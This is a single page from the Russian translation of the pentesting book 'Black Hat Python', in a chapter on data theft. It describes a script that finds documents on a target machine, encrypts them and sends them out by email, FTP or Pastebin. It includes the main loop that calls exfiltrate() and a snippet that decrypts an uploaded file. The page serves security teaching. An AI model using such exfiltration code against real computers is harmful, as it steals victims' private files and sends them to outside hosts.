# Black Hat Python. Программирование для хакеров и пентестеров — страница 186

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

186   Глава 9. Похищение данных
или plain_ftp), нужно предоставить сам файл, а не закодированную строку .
В этом случае мы читаем его содержимое, шифруем его и записываем в но-
вый файл во временной папке . Мы обращаемся к словарю EXFIL, чтобы
вызвать соответствующий метод, передаем ему путь к новому зашифрован-
ному документу , который нужно вывести из системы , и удаляем файл из
временной папки.
При использовании других методов нет необходимости в создании новых
файлов — достаточно будет прочитать уже существующий файл , зашиф -
ровать его содержимое и обратиться к словарю EXFIL , чтобы отправить
зашифрованное содержимое по электронной почте или опубликовать его
на Pastebin .
В главном блоке мы перебираем все найденные документы и в качестве про-
верки отправляем их с помощью метода plain_paste. Можете выбрать любую
из шести функций, которые мы определили:
if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')
Проверка написанного
Этот код состоит из множества элементов, но сам инструмент довольно прост
в использовании. Просто запустите свой скрипт на атакуемом компьютере
и дождитесь, когда он подтвердит успешное похищение данных по электрон-
ной почте, FTP или с помощью Pastebin.
Если Internet Explorer останется видимым при выполнении функции
paste_exfile.ie_paste , вы сможете наблюдать за всем процессом. В конце,
открыв свою страницу на сайте Pastebin, вы должны увидеть нечто похожее
на рис. 9.1.
Отлично! Наш скрипт exfil.py нашел PDF-документ под названием topo_
post.pdf, зашифровал его содержимое и загрузил его на сайт pastebin.com. Что-
бы успешно расшифровать этот файл, его нужно скачать и передать функции
расшифровки, как показано далее:
from cryptor import decrypt
with open('topo_post_pdf.txt', 'rb') as f: 
    contents = f.read()
with open('newtopo.pdf', 'wb') as f:
    f.write(decrypt(contents)) 
